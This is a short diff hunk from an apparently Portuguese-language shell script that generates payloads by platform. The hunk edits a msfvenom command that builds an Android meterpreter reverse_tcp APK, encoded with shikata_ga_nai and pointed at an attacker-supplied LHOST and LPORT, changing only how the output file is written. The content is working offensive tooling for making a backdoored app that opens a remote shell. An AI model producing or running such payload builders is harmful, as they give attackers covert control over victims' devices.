@@ -50,7 +50,7 @@ case $platform in
     ;;
   2)
     echo "Criando exploit Android..."
-    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f apk > android_exploit.apk
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -o android_exploit.apk
     ;;
   3)
     echo "Criando exploit Linux..."
